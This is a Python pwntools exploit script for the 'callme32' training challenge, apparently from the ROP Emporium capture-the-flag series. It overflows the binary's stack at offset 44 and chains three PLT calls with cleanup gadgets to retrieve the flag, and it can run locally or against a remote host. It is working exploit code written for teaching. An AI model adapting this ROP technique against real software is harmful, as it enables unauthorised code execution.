#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('> ', payload)
    
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './callme32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

offset = 44 # find_ip(cyclic(100))

# Per the instructions
param_1 = 0xdeadbeef
param_2 = 0xcafebabe
param_3 = 0xd00df00d

io = start()

# Note that these are all @plt addresses
# Obtained via gdb: info functions
callme_one = 0x080484f0
callme_two = 0x08048550
callme_three = 0x080484e0

# 0x080487f9: pop esi; pop edi; pop ebp; ret;
pop_esi_edi_ebp_ret = 0x080487f9    # We need this gadget so we can restore the state of the stack
                                    # after each function call

payload = flat({
	offset: [
        callme_one,
        pop_esi_edi_ebp_ret,
        param_1,
        param_2,
        param_3,
        callme_two,
        pop_esi_edi_ebp_ret,
        param_1,
        param_2,
        param_3,
        callme_three,
        pop_esi_edi_ebp_ret,
        param_1,
        param_2,
        param_3,
    ]
})

io.sendlineafter("> ", payload)
flag = io.recv()
log.success(flag.decode("utf-8"))
